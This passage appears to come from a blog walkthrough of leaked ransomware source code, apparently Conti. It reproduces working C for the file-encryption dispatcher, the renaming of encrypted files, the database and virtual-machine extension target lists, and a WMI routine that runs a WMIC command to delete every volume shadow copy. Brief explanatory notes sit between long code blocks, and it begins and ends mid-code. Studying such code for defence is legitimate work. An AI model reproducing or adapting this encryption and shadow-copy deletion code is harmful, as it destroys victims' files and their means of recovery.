<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cryptor::ChangeFileName(__in LPCWSTR OldName)</span><br><span class="line">&#123;</span><br><span class="line">	LPWSTR NewName = (LPWSTR)memory::Alloc(<span class="number">32727</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NewName) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	morphcode((LPVOID)NewName);</span><br><span class="line"></span><br><span class="line">	plstrcpyW(NewName, OldName);</span><br><span class="line"></span><br><span class="line">	morphcode((LPVOID)NewName);</span><br><span class="line"></span><br><span class="line">	plstrcatW(NewName, global::GetExtention());</span><br><span class="line"></span><br><span class="line">	morphcode((LPVOID)OldName);</span><br><span class="line"></span><br><span class="line">	pMoveFileW(OldName, NewName);</span><br><span class="line">	memory::Free(NewName);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="cryptor-Encrypt"><a href="#cryptor-Encrypt" class="headerlink" title="cryptor::Encrypt"></a>cryptor::Encrypt</h4><ul>
<li>Genkey</li>
<li>OpenFileEncrypt</li>
<li>CheckForDataBases<ul>
<li>WriteEncryptionInfo(FileInfo,FULL_ENCRYPT,0)</li>
<li>EncryptFull</li>
</ul>
</li>
<li>CheckForVirtualMachines<ul>
<li>WriteEncryptionInfo(FileInfo,PARTLY_ENCRYPT,20)</li>
<li>EncryptPartly</li>
</ul>
</li>
<li>judge the file size and use the fittest funtion to encrypt the different size range of file</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">BOOL</span><br><span class="line"><span class="title function_">cryptor::Encrypt</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in LPFILE_INFO FileInfo,</span></span><br><span class="line"><span class="params">	__in LPBYTE Buffer,</span></span><br><span class="line"><span class="params">	__in HCRYPTPROV CryptoProvider,</span></span><br><span class="line"><span class="params">	__in HCRYPTKEY PublicKey</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	BOOL Result = FALSE;</span><br><span class="line">	DWORD BytesToRead = <span class="number">0</span>;</span><br><span class="line">	LONGLONG TotalRead = <span class="number">0</span>;</span><br><span class="line">	LONGLONG TotalWrite = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!GenKey(CryptoProvider, PublicKey, FileInfo)) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t gen key for file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!OpenFileEncrypt(FileInfo)) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (CheckForDataBases(FileInfo-&gt;Filename)) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!WriteEncryptInfo(FileInfo, FULL_ENCRYPT, <span class="number">0</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Result = EncryptFull(FileInfo, Buffer, CryptoProvider, PublicKey);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (CheckForVirtualMachines(FileInfo-&gt;Filename)) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!WriteEncryptInfo(FileInfo, PARTLY_ENCRYPT, <span class="number">20</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Result = EncryptPartly(FileInfo, Buffer, CryptoProvider, PublicKey, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (FileInfo-&gt;FileSize &lt;= <span class="number">1048576</span>) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!WriteEncryptInfo(FileInfo, FULL_ENCRYPT, <span class="number">0</span>)) &#123;</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Result = EncryptFull(FileInfo, Buffer, CryptoProvider, PublicKey);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (FileInfo-&gt;FileSize &lt;= <span class="number">5242880</span>) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!WriteEncryptInfo(FileInfo, HEADER_ENCRYPT, <span class="number">0</span>)) &#123;</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Result = EncryptHeader(FileInfo, Buffer, CryptoProvider, PublicKey);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!WriteEncryptInfo(FileInfo, PARTLY_ENCRYPT, global::GetEncryptSize())) &#123;</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Result = EncryptPartly(FileInfo, Buffer, CryptoProvider, PublicKey, global::GetEncryptSize());</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Result) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(FileInfo-&gt;FileHandle);</span><br><span class="line">		FileInfo-&gt;FileHandle = INVALID_HANDLE_VALUE;</span><br><span class="line">		ChangeFileName(FileInfo-&gt;Filename);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseFile(FileInfo);</span><br><span class="line">	<span class="keyword">return</span> Result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="cryptor-DeleteShadowCopies"><a href="#cryptor-DeleteShadowCopies" class="headerlink" title="cryptor::DeleteShadowCopies"></a>cryptor::DeleteShadowCopies</h4><h5 id="Initialize-COM"><a href="#Initialize-COM" class="headerlink" title="Initialize COM"></a>Initialize COM</h5><ul>
<li>hres &#x3D; (HRESULT)<strong>pCoInitializeEx</strong>(0, COINIT_MULTITHREADED)</li>
</ul>
<h5 id="Set-general-COM-security-levels"><a href="#Set-general-COM-security-levels" class="headerlink" title="Set general COM security levels"></a>Set general COM security levels</h5><p>Registers security and sets the default security values for the process.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pCoInitializeSecurity(</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">-1</span>,                          <span class="comment">// COM authentication</span></span><br><span class="line">		<span class="literal">NULL</span>,                        <span class="comment">// Authentication services</span></span><br><span class="line">		<span class="literal">NULL</span>,                        <span class="comment">// Reserved</span></span><br><span class="line">		RPC_C_AUTHN_LEVEL_DEFAULT,   <span class="comment">// Default authentication </span></span><br><span class="line">		RPC_C_IMP_LEVEL_IMPERSONATE, <span class="comment">// Default Impersonation  </span></span><br><span class="line">		<span class="literal">NULL</span>,                        <span class="comment">// Authentication info</span></span><br><span class="line">		EOAC_NONE,                   <span class="comment">// Additional capabilities </span></span><br><span class="line">		<span class="literal">NULL</span>                         <span class="comment">// Reserved</span></span><br><span class="line">	);</span><br></pre></td></tr></table></figure>

<h5 id="Obtain-the-initial-locator-to-WMI"><a href="#Obtain-the-initial-locator-to-WMI" class="headerlink" title="Obtain the initial locator to WMI"></a>Obtain the initial locator to WMI</h5><ul>
<li>Intel: pCoCreateInstance(CLSID_WbemLocator,0,CLSCTX_INPROC_SERVER,IID_IWbemLocator, (LPVOID*)&amp;pLoc);</li>
<li>AMD: pCoCreateInstance(CLSID_WbemContext, 0, CLSCTX_INPROC_SERVER, IID_IWbemContext, (LPVOID*)&amp;pContext);<ul>
<li>BSTR Arch &#x3D; pSysAllocString(OBFW(L”__ProviderArchitecture”));</li>
<li>hres &#x3D; pContext-&gt;SetValue(Arch, 0, &amp;vArchitecture);</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">IWbemLocator* pLoc = <span class="literal">NULL</span>;</span><br><span class="line">	hres = (HRESULT)pCoCreateInstance(</span><br><span class="line">		CLSID_WbemLocator,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		CLSCTX_INPROC_SERVER,</span><br><span class="line">		IID_IWbemLocator, (LPVOID*)&amp;pLoc);</span><br><span class="line"></span><br><span class="line">	morphcode(pLoc);</span><br><span class="line"></span><br><span class="line">	IWbemContext* pContext = <span class="literal">NULL</span>;</span><br><span class="line">	SYSTEM_INFO SysInfo;</span><br><span class="line">	pGetNativeSystemInfo(&amp;SysInfo);</span><br><span class="line"></span><br><span class="line">	morphcode(SysInfo.dwActiveProcessorMask);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) &#123;</span><br><span class="line"></span><br><span class="line">		hres = (HRESULT)pCoCreateInstance(CLSID_WbemContext, <span class="number">0</span>, CLSCTX_INPROC_SERVER, IID_IWbemContext, (LPVOID*)&amp;pContext);</span><br><span class="line">		<span class="keyword">if</span> (FAILED(hres))</span><br><span class="line">		&#123;</span><br><span class="line">			pCoUninitialize();</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		morphcode(hres);</span><br><span class="line"></span><br><span class="line">		BSTR Arch = pSysAllocString(OBFW(<span class="string">L&quot;__ProviderArchitecture&quot;</span>));</span><br><span class="line"></span><br><span class="line">		VARIANT vArchitecture;</span><br><span class="line">		pVariantInit(&amp;vArchitecture);</span><br><span class="line">		V_VT(&amp;vArchitecture) = VT_I4;</span><br><span class="line">		V_INT(&amp;vArchitecture) = <span class="number">64</span>;</span><br><span class="line">		hres = pContext-&gt;SetValue(Arch, <span class="number">0</span>, &amp;vArchitecture);</span><br><span class="line"></span><br><span class="line">		morphcode(hres);</span><br><span class="line"></span><br><span class="line">		pVariantClear(&amp;vArchitecture);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (FAILED(hres))</span><br><span class="line">		&#123;</span><br><span class="line">			pCoUninitialize();</span><br><span class="line">			<span class="keyword">return</span> FALSE;                 <span class="comment">// Program has failed.</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Connect-to-WMI-through-the-IWbemLocator-ConnectServer-method"><a href="#Connect-to-WMI-through-the-IWbemLocator-ConnectServer-method" class="headerlink" title="Connect to WMI through the IWbemLocator::ConnectServer method"></a>Connect to WMI through the IWbemLocator::ConnectServer method</h5><p>The WMI namespace root&#x2F;cimv2 is the default namespace and contains classes for computer hardware and configuration.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">BSTR Path = pSysAllocString(OBFW(<span class="string">L&quot;ROOT\\CIMV2&quot;</span>));</span><br><span class="line"></span><br><span class="line">	hres = pLoc-&gt;ConnectServer(</span><br><span class="line">		Path, <span class="comment">// Object path of WMI namespace</span></span><br><span class="line">		<span class="literal">NULL</span>,                    <span class="comment">// User name. NULL = current user</span></span><br><span class="line">		<span class="literal">NULL</span>,                    <span class="comment">// User password. NULL = current</span></span><br><span class="line">		<span class="number">0</span>,                       <span class="comment">// Locale. NULL indicates current</span></span><br><span class="line">		<span class="literal">NULL</span>,                    <span class="comment">// Security flags.</span></span><br><span class="line">		<span class="number">0</span>,                       <span class="comment">// Authority (for example, Kerberos)</span></span><br><span class="line">		pContext,                       <span class="comment">// Context object </span></span><br><span class="line">		&amp;pSvc                    <span class="comment">// pointer to IWbemServices proxy</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	morphcode(pSvc);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (FAILED(hres))</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		pLoc-&gt;Release();</span><br><span class="line">		pCoUninitialize();</span><br><span class="line">		<span class="keyword">return</span> FALSE;                <span class="comment">// Program has failed.</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Set-security-levels-on-the-proxy"><a href="#Set-security-levels-on-the-proxy" class="headerlink" title="Set security levels on the proxy"></a>Set security levels on the proxy</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">hres = (HRESULT)pCoSetProxyBlanket(</span><br><span class="line">		pSvc,                        <span class="comment">// Indicates the proxy to set</span></span><br><span class="line">		RPC_C_AUTHN_WINNT,           <span class="comment">// RPC_C_AUTHN_xxx</span></span><br><span class="line">		RPC_C_AUTHZ_NONE,            <span class="comment">// RPC_C_AUTHZ_xxx</span></span><br><span class="line">		<span class="literal">NULL</span>,                        <span class="comment">// Server principal name </span></span><br><span class="line">		RPC_C_AUTHN_LEVEL_CALL,      <span class="comment">// RPC_C_AUTHN_LEVEL_xxx </span></span><br><span class="line">		RPC_C_IMP_LEVEL_IMPERSONATE, <span class="comment">// RPC_C_IMP_LEVEL_xxx</span></span><br><span class="line">		<span class="literal">NULL</span>,                        <span class="comment">// client identity</span></span><br><span class="line">		EOAC_NONE                    <span class="comment">// proxy capabilities </span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	morphcode(hres);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (FAILED(hres))</span><br><span class="line">	&#123;</span><br><span class="line">		pSvc-&gt;Release();</span><br><span class="line">		pLoc-&gt;Release();</span><br><span class="line">		pCoUninitialize();</span><br><span class="line">		<span class="keyword">return</span> FALSE;               <span class="comment">// Program has failed.</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Use-the-IWbemServices-pointer-to-make-requests-of-WMI"><a href="#Use-the-IWbemServices-pointer-to-make-requests-of-WMI" class="headerlink" title="Use the IWbemServices pointer to make requests of WMI"></a>Use the IWbemServices pointer to make requests of WMI</h5><blockquote>
<h5 id="Get-the-data-from-the-query-in-step-6"><a href="#Get-the-data-from-the-query-in-step-6" class="headerlink" title="Get the data from the query in step 6"></a>Get the data from the query in step 6</h5><p>this is the main code of the function </p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">BSTR WqlStr = pSysAllocString(OBFW(<span class="string">L&quot;WQL&quot;</span>));</span><br><span class="line">BSTR Query = pSysAllocString(OBFW(<span class="string">L&quot;SELECT * FROM Win32_ShadowCopy&quot;</span>));</span><br><span class="line"></span><br><span class="line">IEnumWbemClassObject* pEnumerator = <span class="literal">NULL</span>;</span><br><span class="line">hres = pSvc-&gt;ExecQuery(</span><br><span class="line">	WqlStr,</span><br><span class="line">	Query,</span><br><span class="line">	WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,</span><br><span class="line">	<span class="literal">NULL</span>,</span><br><span class="line">	&amp;pEnumerator);</span><br><span class="line"></span><br><span class="line">morphcode(hres);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (FAILED(hres))</span><br><span class="line">&#123;</span><br><span class="line">	pSvc-&gt;Release();</span><br><span class="line">	pLoc-&gt;Release();</span><br><span class="line">	pCoUninitialize();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;               <span class="comment">// Program has failed.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>get the data from the query and Delete the shadowcopy.</strong></p>
<p>generate the delete shadowcopy command, then use the Enumerator to delete every one of them.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">IWbemClassObject* pclsObj = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uReturn = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	morphcode(pEnumerator);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (pEnumerator)</span><br><span class="line">	&#123;</span><br><span class="line">		HRESULT hr = pEnumerator-&gt;Next(WBEM_INFINITE, <span class="number">1</span>,</span><br><span class="line">			&amp;pclsObj, &amp;uReturn);</span><br><span class="line"></span><br><span class="line">		morphcode(hr);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == uReturn)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		VARIANT vtProp;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Get the value of the Name property</span></span><br><span class="line">		hr = pclsObj-&gt;Get(OBFW(<span class="string">L&quot;ID&quot;</span>), <span class="number">0</span>, &amp;vtProp, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		morphcode(hr);</span><br><span class="line"></span><br><span class="line">		WCHAR CmdLine[<span class="number">1024</span>];</span><br><span class="line">		RtlSecureZeroMemory(CmdLine, <span class="keyword">sizeof</span>(CmdLine));</span><br><span class="line">		wsprintfW(CmdLine, OBFW(<span class="string">L&quot;cmd.exe /c C:\\Windows\\System32\\wbem\\WMIC.exe shadowcopy where \&quot;ID=&#x27;%s&#x27;\&quot; delete&quot;</span>), vtProp.bstrVal);</span><br><span class="line"></span><br><span class="line">		morphcode();</span><br><span class="line"></span><br><span class="line">		LPVOID Old;</span><br><span class="line">		pWow64DisableWow64FsRedirection(&amp;Old);</span><br><span class="line"></span><br><span class="line">		morphcode(Old);</span><br><span class="line"></span><br><span class="line">		CmdExecW(CmdLine);</span><br><span class="line">		pWow64RevertWow64FsRedirection(Old);</span><br><span class="line"></span><br><span class="line">		morphcode(Old);</span><br><span class="line"></span><br><span class="line">		pVariantClear(&amp;vtProp);</span><br><span class="line">		pclsObj-&gt;Release();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Cleanup"><a href="#Cleanup" class="headerlink" title="Cleanup"></a>Cleanup</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pContext) &#123;</span><br><span class="line">		pContext-&gt;Release();</span><br><span class="line">	&#125;</span><br><span class="line">	pSvc-&gt;Release();</span><br><span class="line">	pLoc-&gt;Release();</span><br><span class="line">	pEnumerator-&gt;Release();</span><br><span class="line">	pCoUninitialize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CmdExecW"><a href="#CmdExecW" class="headerlink" title="CmdExecW"></a>CmdExecW</h4><p>first set the STARTUPINFOW’s property——<strong>wShowWindow</strong>, then CreateProcess using the arg Cmdline passed in.</p>
<h4 id="CheckForDataBases"><a href="#CheckForDataBases" class="headerlink" title="CheckForDataBases"></a>CheckForDataBases</h4><p>generate a long list of Extensions that are database.And check the file extension if in the Database Extension List.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">INT Count = <span class="keyword">sizeof</span>(Extensions) / <span class="keyword">sizeof</span>(LPWSTR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; Count; i++) &#123;</span><br><span class="line"></span><br><span class="line">	morphcode((LPVOID)Filename);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pStrStrIW(Filename, Extensions[i])) &#123;</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CheckForVirtualMachines"><a href="#CheckForVirtualMachines" class="headerlink" title="CheckForVirtualMachines"></a>CheckForVirtualMachines</h4><p>Extension</p>
<blockquote>
<p>OBFW(L”.vdi”),OBFW(L”.vhd”),OBFW(L”.vmdk”),OBFW(L”.pvm”),OBFW(L”.vmem”),OBFW(L”.vmsn”),OBFW(L”.vmsd”),OBFW(L”.nvram”),OBFW(L”.vmx”),OBFW(L”.raw”),OBFW(L”.qcow2”),OBFW(L”.subvol”),OBFW(L”.bin”),OBFW(L”.vsv”),OBFW(L”.avhd”),OBFW(L”.vmrs”),OBFW(L”.vhdx”),OBFW(L”.avdx”),OBFW(L”.vmcx”),OBFW(L”.iso”)</p>
</blockquote>
<p>then check the file extension if in the Virtual Machine Extension List.</p>
<h4 id="WriteFullData"><a href="#WriteFullData" class="headerlink" title="WriteFullData"></a>WriteFullData</h4><p>a normal write function</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">WriteFullData</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in HANDLE hFile,</span></span><br><span class="line"><span class="params">	__in LPVOID Buffer,</span></span><br><span class="line"><span class="params">	__in DWORD Size</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD TotalWritten = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesWritten = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesToWrite = Size;</span><br><span class="line">	DWORD Offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TotalWritten != Size)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		morphcode(TotalWritten);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pWriteFile(hFile, (LPBYTE)Buffer + Offset, BytesToWrite, &amp;BytesWritten, <span class="literal">NULL</span>) || !BytesWritten) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		morphcode(BytesWritten);</span><br><span class="line"></span><br><span class="line">		Offset += BytesWritten;</span><br><span class="line"></span><br><span class="line">		morphcode(Offset);</span><br><span class="line"></span><br><span class="line">		TotalWritten += BytesWritten;</span><br><span class="line"></span><br><span class="line">		morphcode(BytesToWrite);</span><br><span class="line"></span><br><span class="line">		BytesToWrite -= BytesWritten;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> 